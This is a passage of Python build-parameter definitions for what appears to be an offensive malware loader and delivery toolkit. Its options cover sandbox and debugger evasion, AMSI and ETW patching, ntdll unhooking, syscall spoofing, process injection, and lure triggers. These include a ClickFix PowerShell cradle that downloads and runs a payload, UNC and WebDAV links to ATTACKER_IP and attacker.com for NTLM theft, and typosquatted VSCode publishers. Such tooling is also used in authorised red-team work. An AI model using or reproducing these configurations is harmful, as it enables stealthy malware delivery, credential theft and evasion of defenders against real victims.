            default_value = "C:\\Windows\\System32\\notepad.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="VM Loader"),
                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="2"),
                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="6"),
                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="7"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        # Guardrails Configuration
        BuildParameter(
            name = "0.5a Enable Guardrails",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable guardrails (environment and anti-debugging checks) for the loader",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ],
        ),

        BuildParameter(
            name = "0.5b Check IsDebuggerPresent",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5c Check Remote Debugger",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for remote debugger via NtQueryInformationProcess",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5d Check Debugger Processes",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for known debugger and analysis tool processes",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5e Check Hardware Breakpoints",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for hardware breakpoints in debug registers",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5f Check Timing Anomalies",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5f1 Check Sandbox Environment",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Detect VMs and sandboxes (hypervisor CPUID, low resources, sandbox artifacts, no recent user activity)",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5f2 Check System Uptime",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Reject environments where system uptime is below the configured minimum. "
                "Sandbox VMs are typically spun up fresh per sample and have near-zero uptime; "
                "a real workstation has been running for hours."
            ),
            default_value = False,
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5f3 Minimum Uptime Seconds",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Minimum system uptime in seconds required to proceed (default: 300 = 5 minutes).",
            default_value = "300",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="0.5f2 Check System Uptime", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5f4 Check Screen Resolution",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Require a minimum screen resolution of 1280x1024. Sandboxes and analyst VMs "
                "frequently use low-res virtual displays (800x600, 1024x768) to reduce overhead."
            ),
            default_value = False,
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5f5 Check Secure Boot",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Require UEFI Secure Boot to be enabled (registry: HKLM\\SYSTEM\\CurrentControlSet\\"
                "Control\\SecureBoot\\State, UEFISecureBootEnabled=1). Modern managed corporate "
                "endpoints have Secure Boot on; most sandbox VMs and analyst machines disable it."
            ),
            default_value = False,
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5g Hostname Whitelist",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5h Block Analysis Hostnames",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
            default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5i Block Analysis Usernames",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
            default_value = "analyst,malware,sandbox,user,admin",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5j IP Whitelist",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5k IP Blacklist",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
            default_value = "192.168.122.,172.16.,127.",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5l Domain Whitelist",
            group_name="5 - Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        # Evasion backend toggles (config.hpp CONFIG_SYSCALL_BACKEND /
        # CONFIG_CALLSTACK_SPOOF_ENABLED). Both apply to the native C++
        # loader (Shellcode Loader + DLL Hijack); ClickOnce is unaffected.
        BuildParameter(
            name = "0.5m Syscall Backend",
            group_name="6 - Evasion",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Syscall dispatch layer for Nt* calls.\n"
                "TartarusGate: built-in indirect syscall shim page (x64).\n"
                "SysWhispers3: generated Sw3Nt* stubs (x64).\n"
                "Heaven's Gate: 32-bit WoW64 far-call to CS:0x33 + native syscall. "
                "Requires Loader Architecture = x86. Issues 64-bit syscalls from a "
                "32-bit process without patching any DLL."
            ),
            choices = ["TartarusGate", "SysWhispers3", "Heaven's Gate"],
            default_value = "TartarusGate",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.5n Callstack Spoofing",
            group_name="6 - Evasion",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Enable Callstack Spoofing"
            ),
            default_value = False,
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.2a Loader Architecture", operand=HideConditionOperand.EQ, value="x86"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        # Operator-selectable gadget host modules. InitCallstackSpoof() scans
        # each module's .text for `add rsp, 0x68; ret` (the disp is fixed by
        # callstack_spoof_gas.S's `sub rsp, 112`). Pick modules already mapped
        # into the host process - defaults cover every Win32 process.
        BuildParameter(
            name = "0.5o Callstack Spoof Modules",
            group_name="6 - Evasion",
            parameter_type = BuildParameterType.String,
            description = (
                "Comma-separated module names scanned for the `add rsp, 0x68; ret` gadget. "
                "First match wins. Modules must already be loaded in the host process "
                "(PEB-walk only, no LoadLibrary). "
                "Default: ntdll.dll,kernel32.dll,kernelbase.dll"
            ),
            default_value = "ntdll.dll,kernel32.dll,kernelbase.dll",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.2a Loader Architecture", operand=HideConditionOperand.EQ, value="x86"),
                HideCondition(name="0.5n Callstack Spoofing", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        # Sleep Obfuscation Configuration
        BuildParameter(
            name = "0.5p Sleep Obfuscation",
            group_name="6 - Evasion",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Pre-injection dwell mode.\n"
                "None: no sleep (execute immediately).\n"
                "Timer: WaitableTimer jittered dwell - bypasses sandbox Sleep() acceleration.\n"
                "Ekko-lite: Timer + XOR-encrypt non-.text PE sections during wait (hides shellcode from memory scanners).\n"
                "Exhaustion: Fibonacci burn + 100k CloseHandle API hammering + 100 MB memory touch, then WaitableTimer wait. "
                "Exhausts emulator instruction/syscall budgets so automated sandboxes time out before behaviour is recorded. "
                "Recommended base dwell: 90000 ms (90 seconds)."
            ),
            choices = ["None", "Timer", "Ekko-lite", "Exhaustion"],
            default_value = "None",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.5v Single Instance",
            group_name="7 - Loader Options",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Create a named Global\\ mutex on startup to prevent duplicate beacons. "
                "Required for DLL-based loaders delivered via COM hijacking or Run-key persistence, "
                "where the loader may be invoked multiple times before the first beacon checks in."
            ),
            default_value = False,
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.5q Sleep Base MS",
            group_name="6 - Evasion",
            parameter_type = BuildParameterType.String,
            description = "Base dwell in milliseconds before injection. Actual dwell = base + random(0, jitter).",
            default_value = "5000",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.5p Sleep Obfuscation", operand=HideConditionOperand.EQ, value="None"),
            ]
        ),

        BuildParameter(
            name = "0.5r Sleep Jitter MS",
            group_name="6 - Evasion",
            parameter_type = BuildParameterType.String,
            description = "Maximum random milliseconds added to the base dwell. Set to 0 for fixed dwell.",
            default_value = "3000",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.5p Sleep Obfuscation", operand=HideConditionOperand.EQ, value="None"),
            ]
        ),

        BuildParameter(
            name = "0.5s AMSI Bypass Type",
            group_name="6 - Evasion",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "AMSI bypass depth:\n"
                "0 = Disabled (no patch)\n"
                "1 = Patch AmsiScanBuffer only (default)\n"
                "2 = + Patch AmsiOpenSession\n"
                "3 = + InvalidateAmsiContext (heap-walk, aggressive)\n"
                "4 = Patchless (Dr0 HW-BP + VEH, no byte patches; defeats "
                "PG/CFG integrity scans and signature checks on amsi.dll)"
            ),
            choices = ["0", "1", "2", "3", "4"],
            default_value = "1",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.5t ETW Bypass Type",
            group_name="6 - Evasion",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "ETW bypass depth:\n"
                "0 = Disabled (no patch)\n"
                "1 = Patch EtwEventWrite only (default)\n"
                "2 = + Patch EtwEventWriteFull\n"
                "3 = + UnregisterEtwProviders (TEB walk, aggressive)"
            ),
            choices = ["0", "1", "2", "3"],
            default_value = "1",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.5u Unhook Scope",
            group_name="6 - Evasion",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "NTDLL unhook breadth:\n"
                "0 = None (skip all unhooking)\n"
                "1 = ntdll only (default)\n"
                "2 = ntdll + kernel32 + kernelbase\n"
                "3 = Selective (targeted Nt* function list, lowest noise)"
            ),
            choices = ["0", "1", "2", "3"],
            default_value = "1",
            required = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        # ClickOnce Loader Injection Configuration
        BuildParameter(
            name = "0.6 ClickOnce - Injection Method",
            group_name="8 - ClickOnce",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection method for ClickOnce:
earlycascade (remote)
poolparty (remote) - RemoteTpDirectInsertion
tpjobapc (remote)  - RemoteTpJobDirectInsertion / TpJobObjectApc
classic (remote)
createfiber (self)
enumdesktops (self)
appdomain (self)""",
            choices = ["createfiber", "earlycascade", "poolparty", "tpjobapc", "classic", "enumdesktops", "appdomain"],
            default_value = "createfiber",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.7 ClickOnce - Target Process",
            group_name="8 - ClickOnce",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection methods (leave empty for explorer.exe)",
            default_value = "explorer.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="createfiber"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="enumdesktops"),
            ]
        ),

        BuildParameter(
            name="0.8 Output Extension Source",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose source for the payload ignition and visible extension inside the container (Trigger or MalDoc)",
            choices=["Trigger", "MalDoc"],
            default_value="Trigger",
        ),

        BuildParameter(
            name="0.9 Trigger Type",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.ChooseOne,
            description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain", "VSCode"],
            default_value="BAT",
            required=False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name="0.9-L Linux Trigger Type",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.ChooseOne,
            description="Trigger delivery mechanism for Linux targets.",
            choices=["Bash", "Desktop", "HTML", "QR"],
            default_value="Bash",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
            ],
        ),

        BuildParameter(
            name="0.9-M macOS Trigger Type",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.ChooseOne,
            description="Trigger delivery mechanism for macOS targets.",
            choices=["Command", "AppleScript", "PKG", "HTML", "QR"],
            default_value="Command",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
            ],
        ),

        BuildParameter(
            name = "0.9a Trigger Binary",
            group_name="11 - Triggers",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "C:\\Windows\\System32\\conhost.exe",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="VSCode"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name = "0.9b Trigger Command",
            group_name="11 - Triggers",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="VSCode"),
                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
            ]
        ),

        BuildParameter(
            name="0.9w VSCode Fake Name",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="VSCode extension internal name shown in the Extensions panel. Typosquat a known publisher (e.g. 'vscode-python-tools', 'prettier-vscode').",
            default_value="vscode-python-tools",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type",       operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type",            operand=HideConditionOperand.NotEQ, value="VSCode"),
            ]
        ),

        BuildParameter(
            name="0.9x VSCode Publisher",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="VSCode extension publisher field shown in the Extensions panel. Typosquat a known publisher (e.g. 'ms-python', 'esbenp', 'dbaeumer').",
            default_value="ms-python",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type",       operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type",            operand=HideConditionOperand.NotEQ, value="VSCode"),
            ]
        ),

        BuildParameter(
            name="0.9y VSCode Custom Icon",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.File,
            description="Optional PNG icon shown for the extension in the VSCode Extensions panel. VSCode expects 128x128 PNG; other formats may not render. Leave empty for no icon.",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type",       operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type",            operand=HideConditionOperand.NotEQ, value="VSCode"),
            ]
        ),

        BuildParameter(
            name="0.9c ClickFix Command",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Command copied to clipboard when user clicks verify button. Use a PowerShell download cradle or cmd chain.",
            default_value='powershell -w hidden -ep bypass -c "iwr -uri PAYLOAD_URL -outfile $env:TEMP\\update.exe; & $env:TEMP\\update.exe"',
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="ClickFix"),
            ]
        ),

        BuildParameter(
            name="0.9d URL Target",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description=(
                "Target URL for the internet shortcut (.url) trigger.\n"
                "SMB/UNC mode  (file://): file://ATTACKER_IP/share/payload.exe\n"
                "  → Explorer opens the UNC path; Responder/relay captures NTLM.\n"
                "WebDAV mode   (http://): http://ATTACKER_IP/payload.exe\n"
                "  → Auto-mounts attacker WebDAV; executes payload from mapped drive.\n"
            ),
            default_value="file://ATTACKER_IP/share/payload.exe",
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="URL"),
            ]
        ),

        BuildParameter(
            name="0.9e HTML Password",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Password required to decrypt and trigger the payload. Stored as PBKDF2 hash in HTML - prevents automated sandbox detonation.",
            default_value="Passw0rd!",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="HTML-Encrypted"),
            ]
        ),

        BuildParameter(
            name="0.9f Allowed Countries",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Comma-separated ISO-3166-1 alpha-2 country codes to allow (e.g. US,GB,CA). Visitors outside these countries are redirected to the fallback URL.",
            default_value="US,GB,CA,AU,DE,FR",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="HTML-Geofenced"),
            ]
        ),

        BuildParameter(
            name="0.9g Geofence Fallback URL",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="URL to redirect blocked visitors to (e.g. https://www.microsoft.com). Leave blank for silent fail.",
            default_value="https://www.microsoft.com",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="HTML-Geofenced"),
            ]
        ),

        BuildParameter(
            name="0.9h WebDAV Host",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Attacker-controlled WebDAV host for search-ms trigger (no scheme/port, e.g. dav.attacker.com).",
            default_value="dav.attacker.com",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="SearchMS"),
            ]
        ),

        BuildParameter(
            name="0.9i WebDAV Share",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="WebDAV share path (e.g. share). Files served from this share have no MOTW.",
            default_value="share",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="SearchMS"),
            ]
        ),

        BuildParameter(
            name="0.9j UDL Attacker Host",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Attacker-controlled SMB listener hostname or IP for UDL Net-NTLM coercion.",
            default_value="attacker.com",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="UDL"),
            ]
        ),

        BuildParameter(
            name="0.9k QR Code URL",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="URL to encode in the QR code. The URL has no plaintext representation in the HTML source - defeats link scanner URL extraction.",
            default_value="https://login.microsoftonline.com/",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="QR"),
            ]
        ),

        BuildParameter(
            name="0.9l AppDomain Target EXE",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.ChooseOne,
            description="Signed .NET LOLBIN to target. The .config file must be placed alongside this EXE.",
            choices=["AddInProcess64", "AddInProcess32", "dfsvc64", "AppLaunch", "ServiceHubHost"],
            default_value="AddInProcess64",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
